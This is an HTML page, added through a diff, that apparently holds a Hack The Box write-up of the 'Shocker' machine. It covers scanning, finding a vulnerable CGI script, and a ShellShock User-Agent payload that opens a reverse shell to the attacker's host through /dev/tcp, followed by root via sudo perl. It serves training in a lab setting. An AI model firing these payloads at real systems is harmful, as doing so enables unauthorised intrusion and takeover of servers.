@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="HTB:Shocker#The name Shocker gives away pretty quickly what I’ll need to do on this box. There were a couple things to look out for along the way.
+be careful when directory brute forcing, as the server is misconfigured in that the cgi-bin directory doesn’t show up without a trailing slash. This means that tools like gobuster and feroxbuster miss it in their default state. I’ll show both manually exploiting ShellShock and using the nmap script to identify it is vulnerable.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Shocker" />
+<meta property="og:description" content="HTB:Shocker#The name Shocker gives away pretty quickly what I’ll need to do on this box. There were a couple things to look out for along the way.
+be careful when directory brute forcing, as the server is misconfigured in that the cgi-bin directory doesn’t show up without a trailing slash. This means that tools like gobuster and feroxbuster miss it in their default state. I’ll show both manually exploiting ShellShock and using the nmap script to identify it is vulnerable." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xf3n9.github.io/docs/hackthebox/shocker/" /><meta property="article:section" content="docs" />
+
+
+<title>Shocker | xf3n9 secwalk</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.c58292d36b18b675680ab9baea2029204537b839ea72f258746ec0f32ce8d6c8.css" integrity="sha256-xYKS02sYtnVoCrm66iApIEU3uDnqcvJYdG7A8yzo1sg=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><span>xf3n9 secwalk</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://xf3n9.github.io/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>🍔Hack the Box</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hackthebox/bashed/" class="">Bashed</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hackthebox/nibbles/" class="">Nibbles</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hackthebox/inject/" class="">Inject</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hackthebox/shocker/" class="active">Shocker</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hackthebox/brainfuck/" class="">Brainfuck</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>🍕Vulnhub</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/vulnhub/golden-eye/" class="">Golden Eye</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        🌮Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="#"  target="_blank" rel="noopener">
+        About
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Shocker</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#htbshocker">HTB:Shocker</a>
+      <ul>
+        <li><a href="#recon">Recon</a>
+          <ul>
+            <li><a href="#nmap">nmap</a></li>
+            <li><a href="#website---tcp-80">Website - TCP 80</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-shelly">Shell as shelly</a>
+          <ul>
+            <li><a href="#shellshock-background">ShellShock Background</a></li>
+            <li><a href="#finding-shellshock">Finding ShellShock</a></li>
+            <li><a href="#shell">Shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-root">Shell as root</a>
+          <ul>
+            <li><a href="#enumeration">Enumeration</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="htbshocker">
+  HTB:Shocker
+  <a class="anchor" href="#htbshocker">#</a>
+</h1>
+<p>The name Shocker gives away pretty quickly what I’ll need to do on this box. There were a couple things to look out for along the way.</p>
+<ul>
+<li>be careful when directory brute forcing, as the server is misconfigured in that the cgi-bin directory doesn’t show up without a trailing slash. This means that tools like gobuster and feroxbuster miss it in their default state. I’ll</li>
+<li>show both manually exploiting ShellShock and using the nmap script to identify it is vulnerable.</li>
+<li>Root is a simple GTFObin in perl.</li>
+<li>In Beyond Root, I’ll look at the Apache config and go down a rabbit hole looking at what commands cause execution to stop in ShellShock and try to show how I experimented to come up with a theory that seems to explain what’s happening.</li>
+</ul>
+<h2 id="recon">
+  Recon
+  <a class="anchor" href="#recon">#</a>
+</h2>
+<h3 id="nmap">
+  nmap
+  <a class="anchor" href="#nmap">#</a>
+</h3>
+<p><code>nmap</code> found two open TCP ports, SSH (2222) and HTTP (80):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>oxdf@parrot$ nmap -p- --min-rate <span style="color:#ae81ff">10000</span> -oA scans/nmap-alltcp 10.10.10.56
+</span></span><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-16 06:29 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.56
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.025s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>2222/tcp open  EtherNetIP-1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.18 seconds
+</span></span><span style="display:flex;"><span>oxdf@parrot$ nmap -p 80,2222 -sCV -oA scans/nmap-tcpscripts 10.10.10.56
+</span></span><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-16 06:30 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.56
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.018s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.35 seconds
+</span></span></code></pre></div><h3 id="website---tcp-80">
+  Website - TCP 80
+  <a class="anchor" href="#website---tcp-80">#</a>
+</h3>
+<h4 id="site">
+  Site
+  <a class="anchor" href="#site">#</a>
+</h4>
+<p>The site is incredibly simple:</p>
+<h4 id="directory-brute-force">
+  Directory Brute Force
+  <a class="anchor" href="#directory-brute-force">#</a>
+</h4>
+<p>
+  <a href="https://github.com/epi052/feroxbuster">FeroxBuster</a>, even with a couple extensions as just a guess, only finds <code>index.html</code> and a 403 forbidden on <code>server-status</code>, which is typical for Apache:</p>
+<p>There’s a misconfiguration on Shocker that’s worth understanding. Typically, most webservers will handle a request to a directory without a trailing slash by sending a redirect to the same path but with the trailing slash. But in this case, there is a directory on Shocker that sends a 404 Not Found with visited without the trailing slash. I’ll dig into the configuration and why in 
+  <a href="https://0xdf.gitlab.io/2021/05/25/htb-shocker.html#apache-config">Beyond Root</a>.</p>
+<p>Tools like 
+  <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> and <code>dirb</code> actually take the input wordlist and loop over each entry sending two requests, with and without the trailing slash. This is really helpful in a case like shocker, but will double the amount of requests sent (and thus time) each time there’s a scan. Both <code>gobuster</code> and <code>feroxbuster</code> have a <code>-f</code> flag to force adding the <code>/</code> to the end of directories. For Shocker, running with <code>-f</code> does find something else:</p>
+<h4 id="usersh">
+  user.sh
+  <a class="anchor" href="#usersh">#</a>
+</h4>
+<p>Visiting <code>/cgi-bin/user.sh</code> returns a file that Firefox isn’t sure how to handle:</p>
+<p>Opening it in a text editor shows the content:</p>
+<pre tabindex="0"><code>Content-Type: text/plain
+
+Just an uptime test script
+
+ 07:03:54 up 13:33,  0 users,  load average: 0.06, 0.11, 0.04
+</code></pre><h2 id="shell-as-shelly">
+  Shell as shelly
+  <a class="anchor" href="#shell-as-shelly">#</a>
+</h2>
+<h3 id="shellshock-background">
+  ShellShock Background
+  <a class="anchor" href="#shellshock-background">#</a>
+</h3>
+<p>
+  <a href="https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29">ShellShock</a>, AKA Bashdoor or CVE-2014-6271, was a vulnerability in Bash discovered in 2014 which has to do with the Bash syntax for defining functions. It allowed an attacker to execute commands in places where it should only be doing something safe like defining an environment variable. An initial POC was this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>env x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span style="color:#e6db74">&#34;echo this is a test&#34;</span>
+</span></span></code></pre></div><h3 id="finding-shellshock">
+  Finding ShellShock
+  <a class="anchor" href="#finding-shellshock">#</a>
+</h3>
+<h4 id="manually">
+  Manually
+  <a class="anchor" href="#manually">#</a>
+</h4>
+<h4 id="nmap-script">
+  nmap script
+  <a class="anchor" href="#nmap-script">#</a>
+</h4>
+<p><code>nmap</code> has a 
+  <a href="https://nmap.org/nsedoc/scripts/http-shellshock.html">script</a> to test for ShellShock. I’ll need to give it the URI for the script to check:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV -p <span style="color:#ae81ff">80</span> --script http-shellshock --script-args uri<span style="color:#f92672">=</span>/cgi-bin/user.sh 10.10.10.56
+</span></span></code></pre></div><p>I captured that in Wireshark to see what it was doing. The request with the exploit check is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /cgi-bin/user.sh <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">() { :;}; echo; echo -n kgbyrbl; echo pkzxdko</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">() { :;}; echo; echo -n kgbyrbl; echo pkzxdko</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">() { :;}; echo; echo -n kgbyrbl; echo pkzxdko</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.10.56</span>
+</span></span></code></pre></div><p>First, it’s worth noting that technically this is executing code on the scanned machine. So while it’s just an echo, it’s still RCE, so it’s worth knowing that and making sure you’re within scope / laws / ethics.</p>
+<p>The result is multiple prints of the two strings, showing that ShellShock here is successful in <code>Referer</code>, <code>Cookie</code>, and <code>User-Agent</code>.</p>
+<h3 id="shell">
+  Shell
+  <a class="anchor" href="#shell">#</a>
+</h3>
+<p>I’ll start a <code>nc</code> listener on tcp 443, and then send the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>User-Agent: <span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :;<span style="color:#f92672">}</span>; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>The web request hangs, and I get a shell at <code>nc</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span></code></pre></div><p>I’ll get a full shell with the normal trick:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>ctrl+z
+</span></span><span style="display:flex;"><span>stty raw echo ;fg
+</span></span></code></pre></div><p>And get <code>user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat user.txt
+</span></span></code></pre></div><h2 id="shell-as-root">
+  Shell as root
+  <a class="anchor" href="#shell-as-root">#</a>
+</h2>
+<h3 id="enumeration">
+  Enumeration
+  <a class="anchor" href="#enumeration">#</a>
+</h3>
+<p>I also manually check <code>sudo -l</code> before uploading any kind of enumeration script, and it pays off here:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shelly@Shocker:/home/shelly$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> shelly on Shocker:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User shelly may run the following commands on Shocker:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl
+</span></span></code></pre></div><p><code>perl</code> has a <code>-e</code> option that allows me to run Perl from the command line. It also has an <code>exec</code> command that will run shell commands. Putting that together, I can run <code>bash</code> as root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#htbshocker">HTB:Shocker</a>
+      <ul>
+        <li><a href="#recon">Recon</a>
+          <ul>
+            <li><a href="#nmap">nmap</a></li>
+            <li><a href="#website---tcp-80">Website - TCP 80</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-shelly">Shell as shelly</a>
+          <ul>
+            <li><a href="#shellshock-background">ShellShock Background</a></li>
+            <li><a href="#finding-shellshock">Finding ShellShock</a></li>
+            <li><a href="#shell">Shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-root">Shell as root</a>
+          <ul>
+            <li><a href="#enumeration">Enumeration</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
